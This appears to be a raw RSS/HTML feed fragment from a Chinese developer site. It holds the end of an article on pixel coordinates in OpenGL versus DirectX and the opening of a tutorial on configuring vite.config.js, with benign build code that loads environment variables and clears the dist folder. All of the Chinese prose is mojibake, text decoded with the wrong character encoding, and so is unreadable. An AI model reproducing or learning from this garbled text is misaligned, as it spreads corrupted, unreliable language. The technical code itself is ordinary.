<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/71a3a07a2c17406093516d89507294cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=HVxwG%2FnH9UGa3L2xMYvQ66E4608%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>å›¾2.7. æŠ•å½±å˜æ¢åçš„å›¾å…ƒä½äºå•ä½ç«‹æ–¹ä½“ä¸­ï¼Œå±å¹•æ˜ å°„ç¨‹åºè´Ÿè´£åœ¨å±å¹•ä¸Šæ‰¾åˆ°åæ ‡ã€‚</p>
</div>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æè¿°æ•´æ•°å’Œæµ®ç‚¹å€¼å¦‚ä½•ä¸åƒç´ ï¼ˆå’Œçº¹ç†åæ ‡ï¼‰ç›¸å…³ã€‚ç»™å®šåƒç´ çš„æ°´å¹³æ•°ç»„å¹¶ä½¿ç”¨ç¬›å¡å°”åæ ‡ï¼Œæœ€å·¦è¾¹åƒç´ çš„å·¦è¾¹ç¼˜åœ¨æµ®ç‚¹åæ ‡ä¸­ä¸º0.0ã€‚OpenGLä¸€ç›´ä½¿ç”¨è¿™ç§æ–¹æ¡ˆï¼ŒDirectX10åŠå…¶åç»­ç‰ˆæœ¬ä¹Ÿä½¿ç”¨å®ƒã€‚è¯¥åƒç´ çš„ä¸­å¿ƒä¸º0.5ã€‚å› æ­¤ï¼Œä¸€ç³»åˆ—åƒç´  [0,9] è¦†ç›–äº† [0.0,10.0) çš„è·¨åº¦ã€‚è½¬æ¢å¾ˆç®€å•ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"/><mtd><mrow><mi>d</mi><mo>=</mo><mi>f</mi><mi>l</mi><mi>o</mi><mi>o</mi><mi>r</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"/><mtd><mtext>(2.1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">d = floor(c) \tag{2.1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.02778em;">oor</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2.1</span></span><span class="mord">)</span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"/><mtd><mrow><mi>c</mi><mo>=</mo><mi>d</mi><mo>+</mo><mn>0.5</mn></mrow></mtd><mtd width="50%"/><mtd><mtext>(2.2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">c = d + 0.5 \tag{2.2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.5</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2.2</span></span><span class="mord">)</span></span></span></span></span></span></div>
<p>å…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>æ˜¯åƒç´ çš„ç¦»æ•£ï¼ˆæ•´æ•°ï¼‰ç´¢å¼•ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span>æ˜¯åƒç´ å†…çš„è¿ç»­ï¼ˆæµ®ç‚¹ï¼‰å€¼ã€‚</p>
<p>è™½ç„¶æ‰€æœ‰APIçš„åƒç´ ä½ç½®å€¼éƒ½ä»å·¦åˆ°å³å¢åŠ ï¼Œä½†åœ¨OpenGLå’ŒDirectX<sup><a href="#user-content-fn-2" id="user-content-user-content-fnref-2" data-footnote-ref="" aria-describedby="footnote-label" title="#user-content-fn-2">1</a></sup>ä¹‹é—´çš„æŸäº›æƒ…å†µä¸‹ï¼Œé¡¶éƒ¨å’Œåº•éƒ¨è¾¹ç¼˜çš„é›¶ä½ç½®ä¸ä¸€è‡´ã€‚OpenGLå§‹ç»ˆåçˆ±ç¬›å¡å°”ç³»ç»Ÿï¼Œå°†å·¦ä¸‹è§’è§†ä¸ºæœ€ä½å€¼å…ƒç´ ï¼Œè€ŒDirectXæœ‰æ—¶æ ¹æ®ä¸Šä¸‹æ–‡å°†å·¦ä¸Šè§’å®šä¹‰ä¸ºè¯¥å…ƒç´ ã€‚æ¯ä¸ªäººéƒ½æœ‰ä¸€ä¸ªé€»è¾‘ï¼Œåœ¨ä»–ä»¬ä¸åŒçš„åœ°æ–¹ä¸å­˜åœ¨æ­£ç¡®çš„ç­”æ¡ˆã€‚ä¾‹å¦‚ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0</span><span class="mclose">)</span></span></span></span></span>åœ¨ OpenGLä¸­ä½äºå›¾åƒçš„å·¦ä¸‹è§’ï¼Œè€Œåœ¨DirectXä¸­ä½äºå·¦ä¸Šè§’ã€‚åœ¨ä»ä¸€ä¸ªAPIè¿ç§»åˆ°å¦ä¸€ä¸ªAPIæ—¶ï¼Œå¿…é¡»è€ƒè™‘åˆ°è¿™ç§å·®å¼‚ã€‚</p>
<h3 class="sr-only" id="user-content-footnote-label" data-id="heading-7">Footnotes</h3>
<ol>
<li id="user-content-user-content-fn-2">
<p>â€œDirect3Dâ€æ˜¯DirectXçš„ä¸‰ç»´å›¾å½¢APIç»„ä»¶ã€‚DirectXåŒ…æ‹¬å…¶ä»–APIå…ƒç´ ï¼Œä¾‹å¦‚è¾“å…¥å’ŒéŸ³é¢‘æ§ä»¶ã€‚æˆ‘ä»¬ä¸åŒºåˆ†åœ¨æŒ‡å®šç‰¹å®šç‰ˆæœ¬æ—¶ç¼–å†™â€œDirectXâ€å’Œåœ¨è®¨è®ºæ­¤ç‰¹å®šAPIæ—¶ç¼–å†™â€œDirect3Dâ€ï¼Œè€Œæ˜¯é€šè¿‡å§‹ç»ˆç¼–å†™â€œDirectXâ€æ¥éµå¾ªå¸¸è§ç”¨æ³•ã€‚ <a href="#user-content-fnref-2" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content" title="#user-content-fnref-2">â†©</a></p>
</li>
</ol>
</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vite.config.js 8 å¤§æ ¸å¿ƒæ¨¡å—ï¼Œä¸€æ–‡åƒé€]]></title>    <link>https://juejin.cn/post/7597634458697383942</link>    <guid>https://juejin.cn/post/7597634458697383942</guid>    <pubDate>2026-01-21T12:46:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597634458697383942" data-draft-id="7597596202025631786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vite.config.js 8 å¤§æ ¸å¿ƒæ¨¡å—ï¼Œä¸€æ–‡åƒé€"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-21T12:46:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="yyt_"/> <meta itemprop="url" content="https://juejin.cn/user/1162607282632969"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vite.config.js 8 å¤§æ ¸å¿ƒæ¨¡å—ï¼Œä¸€æ–‡åƒé€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1162607282632969/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    yyt_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:46:38.000Z" title="Wed Jan 21 2026 12:46:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Vite æ˜¯ä»€ä¹ˆï¼Ÿâ€”â€” é¢å‘æœªæ¥çš„å‰ç«¯æ„å»ºå·¥å…·</h2>
<p>Viteï¼ˆæ³•è¯­æ„ä¸ºâ€œå¿«â€ï¼‰æ˜¯ç”± Vue ä½œè€…å°¤é›¨æºªåˆ›å»ºçš„æ–°å‹å‰ç«¯æ„å»ºå·¥å…·ã€‚å®ƒåˆ©ç”¨æµè§ˆå™¨åŸç”Ÿæ”¯æŒ ES æ¨¡å—ï¼ˆESMï¼‰çš„èƒ½åŠ›ï¼Œåœ¨å¼€å‘ç¯å¢ƒä¸‹å®ç°äº†æå¿«çš„å†·å¯åŠ¨å’Œçƒ­æ›´æ–°ï¼›è€Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåˆ™é€šè¿‡é¢„æ„å»ºä¾èµ–å’Œ Rollup æ‰“åŒ…è¾“å‡ºé«˜æ€§èƒ½ä»£ç ã€‚</p>
<p>vite.config.js ä½œä¸º Vite å·¥ç¨‹çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œå®šä¹‰äº†æ•´ä¸ªé¡¹ç›®çš„è¿è¡Œè§„åˆ™ã€ç¼–è¯‘é€»è¾‘å’Œéƒ¨ç½²æ–¹æ¡ˆï¼Œæ˜¯è¿æ¥ Vite æ ¸å¿ƒèƒ½åŠ›ä¸é¡¹ç›®å®é™…éœ€æ±‚çš„æ¡¥æ¢ï¼Œä¸€ä»½å®Œå–„çš„ vite.config.js èƒ½å¤Ÿè®©å‰ç«¯å·¥ç¨‹åŒ–æµç¨‹æ›´é«˜æ•ˆã€æ›´è§„èŒƒã€‚</p>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”ï¼šVite vs Webpack</h2>
<p>è™½ç„¶ Vite å’Œ Webpack éƒ½ç”¨äºæ„å»ºå‰ç«¯åº”ç”¨ï¼Œä½†å®ƒä»¬çš„è®¾è®¡å“²å­¦å®Œå…¨ä¸åŒï¼Œæ ¸å¿ƒæ¦‚å¿µçš„å·®å¼‚ç›´æ¥å†³å®šäº†ä¸¤è€…çš„ä½¿ç”¨ä½“éªŒå’Œæ€§èƒ½è¡¨ç°ï¼š</p>



































<table><thead><tr><th>æ¦‚å¿µ</th><th>Webpack</th><th>Vite</th></tr></thead><tbody><tr><td>Entryï¼ˆå…¥å£ï¼‰</td><td>æ˜¾å¼é…ç½® entry å­—æ®µï¼Œä» JS å…¥å£å¼€å§‹é€’å½’è§£æä¾èµ–</td><td>é»˜è®¤ä»¥ index.html ä¸ºå…¥å£ï¼Œå¼€å‘æ—¶æŒ‰éœ€åŠ è½½ ESM æ¨¡å—ï¼Œç”Ÿäº§ç¯å¢ƒå¯æ˜¾å¼é…ç½® HTML å…¥å£</td></tr><tr><td>Chunkï¼ˆä»£ç å—ï¼‰</td><td>æ„å»ºé˜¶æ®µé™æ€åˆ†æç”Ÿæˆ chunks</td><td>å¼€å‘æ—¶æ— éœ€ç”Ÿæˆ chunkï¼Œç”Ÿäº§æ„å»ºä¾æ‰˜ Rollup å®ç°åŠ¨æ€ä»£ç æ‹†åˆ†</td></tr><tr><td>Loaderï¼ˆè½¬æ¢å™¨ï¼‰</td><td>ä½¿ç”¨ loader å¤„ç†é JS èµ„æºï¼ˆå¦‚ babel-loader, sass-loaderï¼‰</td><td>æ— æ˜ç¡® Loader æ¦‚å¿µï¼Œé€šè¿‡æ’ä»¶æœºåˆ¶ + å†…ç½®è½¬æ¢å™¨å¤„ç†ç‰¹æ®Šèµ„æºï¼Œæ›´çµæ´»é«˜æ•ˆ</td></tr><tr><td>Pluginï¼ˆæ’ä»¶ï¼‰</td><td>æ’ä»¶ç›‘å¬ç”Ÿå‘½å‘¨æœŸé’©å­æ‰©å±•åŠŸèƒ½</td><td>æ’ä»¶ç³»ç»Ÿå¼ºå¤§ï¼Œæ”¯æŒå¼€å‘ã€æ„å»ºåŒæ¨¡å¼ä»‹å…¥ï¼Œå…¼å®¹éƒ¨åˆ† Rollup æ’ä»¶</td></tr><tr><td>Outputï¼ˆè¾“å‡ºï¼‰</td><td>è¾“å‡º bundle åˆ°æŒ‡å®šç›®å½•ï¼Œéœ€é¢å¤–é…ç½®ä¼˜åŒ–</td><td>ç”Ÿäº§ç¯å¢ƒè¾“å‡ºä¼˜åŒ–åçš„é™æ€èµ„æºï¼Œå†…ç½®å¤šç§æ‰“åŒ…ä¼˜åŒ–ç­–ç•¥ï¼Œé…ç½®æ›´ç®€æ´</td></tr></tbody></table>
<h3 data-id="heading-2">å…³é”®åŒºåˆ«ï¼šå¼€å‘ä¸ç”Ÿäº§ç¯å¢ƒçš„å·®å¼‚åŒ–å¤„ç†</h3>
<p>Webpackï¼šå¼€å‘å’Œç”Ÿäº§ç¯å¢ƒå‡èµ°å®Œæ•´çš„æ‰“åŒ…æµç¨‹ï¼Œæ‰€æœ‰æ¨¡å—éœ€æå‰ç¼–è¯‘åˆå¹¶ä¸º bundle æ–‡ä»¶ï¼Œé¡¹ç›®ä½“ç§¯è¶Šå¤§ï¼Œå¯åŠ¨å’Œæ›´æ–°é€Ÿåº¦è¶Šæ…¢ã€‚</p>
<p>Viteï¼š</p>
<ol>
<li>å¼€å‘ç¯å¢ƒï¼šåŸºäºæµè§ˆå™¨ ESM ç›´æ¥è¿è¡Œï¼Œä¸è¿›è¡Œå…¨é‡æ‰“åŒ…ï¼Œä»…å¯¹æµè§ˆå™¨è¯·æ±‚çš„æ¨¡å—è¿›è¡Œå³æ—¶ç¼–è¯‘ï¼Œå“åº”é€Ÿåº¦æå¿«ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒï¼šä½¿ç”¨ Rollup è¿›è¡Œå®Œæ•´æ‰“åŒ…ï¼Œäº§å‡ºç»è¿‡ä»£ç å‹ç¼©ã€æ ‘æ‘‡ä¼˜åŒ–ã€èµ„æºåˆ†ç±»çš„é™æ€èµ„æºï¼Œå…¼é¡¾æ€§èƒ½ä¸å…¼å®¹æ€§ã€‚</li>
</ol>
<p>è¿™æ­£æ˜¯ Vite èƒ½å¤Ÿå®ç°â€œç§’çº§å¯åŠ¨â€çš„æ ¹æœ¬åŸå› ï¼Œæ—¢ä¿è¯äº†å¼€å‘ä½“éªŒï¼Œåˆæ»¡è¶³äº†ç”Ÿäº§ç¯å¢ƒçš„éƒ¨ç½²è¦æ±‚ã€‚</p>
<h2 data-id="heading-3">ä¸‰ã€vite.config.js æ ¸å¿ƒæ¨¡å—é…ç½®å®æˆ˜</h2>
<p>vite.config.js é‡‡ç”¨æ¨¡å—åŒ–å¯¼å‡ºæ–¹å¼ï¼Œæ”¯æŒæ ¹æ®ç¯å¢ƒåŠ¨æ€è¿”å›é…ç½®ï¼Œä¸‹é¢å°†æŒ‰ç…§åŠŸèƒ½æ¨¡å—æ‹†è§£é…ç½®é€»è¾‘ï¼Œè¯¦ç»†è¯´æ˜å„éƒ¨åˆ†çš„é…ç½®ç›®çš„å’Œå®ç°æ–¹å¼ã€‚</p>
<h3 data-id="heading-4">æ¨¡å—ä¸€ï¼šç¯å¢ƒåˆå§‹åŒ–ä¸å¤šç¯å¢ƒé…ç½®</h3>
<p>è¿™æ˜¯é…ç½®æ–‡ä»¶çš„å‰ç½®æ­¥éª¤ï¼Œæ ¸å¿ƒæ˜¯è·å–å½“å‰ç¯å¢ƒå˜é‡ï¼Œå®ç°ä¸åŒç¯å¢ƒä¸‹çš„å·®å¼‚åŒ–é…ç½®ï¼Œä¾èµ– Vite å†…ç½®çš„ <code>loadEnv</code> æ–¹æ³•ã€‚</p>
<h4 data-id="heading-5">é…ç½®é€»è¾‘</h4>
<ol>
<li>æ¥æ”¶ Vite ä¼ å…¥çš„ <code>mode</code> å‚æ•°ï¼Œè¯¥å‚æ•°å¯¹åº”å¯åŠ¨/æ„å»ºå‘½ä»¤ä¸­çš„ç¯å¢ƒï¼ˆå¦‚ developmentã€productionï¼‰ã€‚</li>
<li>é€šè¿‡ <code>loadEnv</code> åŠ è½½å¯¹åº”ç¯å¢ƒçš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚ .env.developmentã€.env.productionï¼‰ã€‚</li>
<li>å®šä¹‰ä¸åŒç¯å¢ƒä¸‹çš„å…¬å…±è·¯å¾„ã€è¾“å‡ºç›®å½•ç­‰æ ¸å¿ƒé…ç½®ï¼Œå®ç°ç¯å¢ƒéš”ç¦»ã€‚</li>
</ol>
<h4 data-id="heading-6">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig, loadEnv } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>;
<span class="hljs-keyword">import</span> rimraf <span class="hljs-keyword">from</span> <span class="hljs-string">'rimraf'</span>;

<span class="hljs-comment">// ç”Ÿæˆæ—¶é—´æˆ³ï¼Œç”¨äºç”Ÿäº§ç¯å¢ƒç‰ˆæœ¬éš”ç¦»</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createFileDate</span> () {
  <span class="hljs-keyword">const</span> today = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
  <span class="hljs-keyword">const</span> y = today.<span class="hljs-title function_">getFullYear</span>();
  <span class="hljs-keyword">const</span> m = today.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span> &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span> : <span class="hljs-string">'0'</span> + (today.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> d = today.<span class="hljs-title function_">getDate</span>() &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getDate</span>() : <span class="hljs-string">'0'</span> + today.<span class="hljs-title function_">getDate</span>();
  <span class="hljs-keyword">const</span> h = today.<span class="hljs-title function_">getHours</span>() &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getHours</span>() : <span class="hljs-string">'0'</span> + today.<span class="hljs-title function_">getHours</span>();
  <span class="hljs-keyword">const</span> M = today.<span class="hljs-title function_">getMinutes</span>() &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getMinutes</span>() : <span class="hljs-string">'0'</span> + today.<span class="hljs-title function_">getMinutes</span>();
  <span class="hljs-keyword">return</span> y + <span class="hljs-string">''</span> + m + <span class="hljs-string">''</span> + d + <span class="hljs-string">''</span> + h + <span class="hljs-string">''</span> + M;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> ({ mode }) =&gt; {
  <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šåŠ è½½ç¯å¢ƒå˜é‡ï¼ŒæŒ‡å®šç¯å¢ƒé…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•</span>
  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">loadEnv</span>(mode, path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'./env'</span>));
  <span class="hljs-keyword">const</span> fileDateDir = <span class="hljs-title function_">createFileDate</span>();
  
  <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šå®šä¹‰å¤šç¯å¢ƒæ ¸å¿ƒé…ç½®é¡¹</span>
  <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒ CDN å…¬å…±è·¯å¾„</span>
  <span class="hljs-keyword">const</span> prodPublicPath = <span class="hljs-string">`https://yyt.com/resources/ph7/<span class="hljs-subst">${fileDateDir}</span>/`</span>;
  <span class="hljs-comment">// æµ‹è¯•ç¯å¢ƒæœ¬åœ°å…¬å…±è·¯å¾„</span>
  <span class="hljs-keyword">const</span> testPublicPath = <span class="hljs-string">'/ph7/'</span>;
  
  <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šç”Ÿäº§ç¯å¢ƒå‰ç½®æ¸…ç†æ—§æ„å»ºäº§ç‰©</span>
  <span class="hljs-keyword">if</span> (mode === <span class="hljs-string">'production'</span>) {
    <span class="hljs-title function_">rimraf</span>(path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'./dist'</span>), <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (err) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ¸…ç† dist ç›®å½•å¤±è´¥ï¼š'</span>, err);
    });
  }

  <span class="hljs-comment">// è¿”å›æœ€ç»ˆé…ç½®</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-comment">// é…ç½®å…¬å…±åŸºç¡€è·¯å¾„ï¼Œæ ¹æ®ç¯å¢ƒåˆ‡æ¢</span>
    <span class="hljs-attr">base</span>: mode === <span class="hljs-string">'production'</span> ? prodPublicPath : testPublicPath,
    <span class="hljs-comment">// å…¶ä»–æ ¸å¿ƒé…ç½®...</span>
  });
};
</code></pre>
<h4 data-id="heading-7">é…ç½®è¯´æ˜</h4>
<ol>
